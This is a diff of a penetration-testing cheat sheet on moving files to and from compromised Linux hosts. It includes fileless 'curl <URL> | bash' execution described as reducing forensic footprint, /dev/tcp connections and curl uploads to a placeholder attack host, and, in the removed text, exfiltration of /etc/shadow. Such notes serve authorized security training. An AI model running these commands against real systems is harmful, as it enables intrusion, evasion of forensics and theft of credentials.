@@ -1,155 +1,84 @@
-## Base64 Transfer
+# Linux File Transfer Methods
 
-Terminal access is available and the file is small enough for manual copy-paste.
+## Download to Linux
 
-Encode a file to a single-line base64 string for terminal output:
+Base64 encode on source, decode on target — no network needed:
 
-```
-cat <FILE_PATH> | base64 -w 0; echo
-```
-
-Decode a base64 string back into a binary or text file on the target:
-
-```
-echo -n '<BASE64_STRING>' | base64 -d > <FILE_PATH>
+```bash
+cat <FILE> | base64 -w 0; echo
 ```
 
-- **Hash mismatch** indicates data corruption during the copy-paste process; always verify with `md5sum`.
-
-## Web Downloads
-
-HTTP/S connectivity exists and standard binaries are available on the target filesystem.
-
-Download a file to a specific local path using wget:
-
-```
-wget <URL> -O <FILE_PATH>
+```bash
+echo -n '<BASE64_BLOB>' | base64 -d > <OUTFILE>
+md5sum <OUTFILE>
 ```
 
-Download a file to a specific local path using curl:
+wget and curl to disk:
 
+```bash
+wget <URL> -O <OUTFILE>
+curl -o <OUTFILE> <URL>
 ```
-curl -o <FILE_PATH> <URL>
-```
 
-- Tool comparison:
-    - wget: use `-O` to define the output destination.
-    - curl: use `-o` (lowercase) to define the output destination.
+Fileless — pipe directly into interpreter, nothing touches disk:
 
-## Fileless Execution
-
-Bypassing disk writes is required to minimize forensic footprint during payload execution.
-
-Pipe a remote script directly into bash for memory-resident execution:
-
-```
+```bash
 curl <URL> | bash
-```
-
-Pipe a remote Python script into the interpreter without saving to disk:
-
-```
 wget -qO- <URL> | python3
 ```
 
-- **Temporary files** may still be created on the OS depending on the specific payload used (e.g., `mkfifo`).
+Pure bash fallback — no curl/wget, just `/dev/tcp` (bash ≥ 2.04):
 
-## Bash /dev/tcp Redirection
-
-Standard transfer tools like wget or curl are missing; requires Bash 2.04+ compiled with net redirections.
-
-1. Open a read/write file descriptor to the attack host:
-
-```
-exec 3<>/dev/tcp/<ATTACK_IP>/<PORT>
-```
-
-2. Manually craft and send an HTTP GET request through the descriptor:
-
-```
-echo -e "GET /<FILE_PATH> HTTP/1.1\n\n">&3
-```
-
-3. Read the incoming response from the attack host:
-
-```
+```bash
+exec 3<>/dev/tcp/<TARGET>/80
+echo -e "GET /<FILE> HTTP/1.1\n\n">&3
 cat <&3
 ```
 
-## SCP Transfers
+SCP pull from your attack host onto the target:
 
-SSH (TCP/22) is reachable and valid credentials or SSH keys are known for the remote host.
-
-Download a file from an attack host to the current directory:
-
-```
-scp <USERNAME>@<ATTACK_IP>:<FILE_PATH> .
+```bash
+sudo systemctl start ssh
+scp <USER>@<LHOST>:<REMOTE_PATH> .
 ```
 
-Upload a local file from the target to the attack host:
+---
 
-```
-scp <FILE_PATH> <USERNAME>@<ATTACK_IP>:<FILE_PATH>
-```
+## Upload from Linux
 
-- **Primary credential exposure** occurs when using your main keys or passwords on a compromised machine; use temporary accounts.
+HTTPS upload server on attack host — self-signed cert, avoids cleartext:
 
-## Secure Web Upload
-
-Secure exfiltration of sensitive files (e.g., `/etc/shadow`) is required over encrypted channels.
-
-1. Install the uploadserver module on the attack host:
-
-```
-python3 -m pip install --user uploadserver
-```
-
-2. Generate a self-signed certificate for HTTPS:
-
-```
+```bash
 openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+mkdir https && cd https
+sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
 ```
 
-3. Start the HTTPS upload listener:
+Upload from target — `--insecure` required for self-signed cert:
 
-```
-python3 -m uploadserver <PORT> --server-certificate server.pem
-```
-
-4. Exfiltrate files from the target using curl:
-
-```
-curl -X POST https://<ATTACK_IP>/upload -F 'files=@<FILE_PATH>' --insecure
+```bash
+curl -X POST https://<LHOST>/upload -F 'files=@<FILE1>' -F 'files=@<FILE2>' --insecure
 ```
 
-- **Insecure flag** (`--insecure`) is mandatory when using self-signed certificates to prevent curl from failing on the TLS handshake.
+Spin up a web server on the compromised host, pull from attack host — use whatever's installed:
 
-## Local Web Servers
-
-Target files must be made available for download by the attack host via ad-hoc listeners.
-
-Spawn a Python 3 listener on all interfaces:
-
-```
-python3 -m http.server <PORT>
+```bash
+python3 -m http.server 8000
+python2.7 -m SimpleHTTPServer 8000
+php -S 0.0.0.0:8000
+ruby -run -ehttpd . -p8000
 ```
 
-Spawn a Python 2.7 listener on all interfaces:
+Then pull from attack host:
 
-```
-python2.7 -m SimpleHTTPServer <PORT>
-```
-
-Spawn a PHP listener on all interfaces:
-
-```
-php -S 0.0.0.0:<PORT>
+```bash
+wget <TARGET_IP>:8000/<FILE>
 ```
 
-Spawn a Ruby listener on all interfaces:
+SCP push from target to attack host:
 
-```
-ruby -run -ehttpd . -p<PORT>
+```bash
+scp <FILE> <USER>@<LHOST>:<REMOTE_PATH>
 ```
 
-- **Inbound traffic blocks** by host or network firewalls will prevent the attack host from reaching these listeners.
+> [!tip] If no upload method works, start a web server on the compromised host and pull from your attack machine — inbound to your attack host is almost always open, outbound from the target may not be.
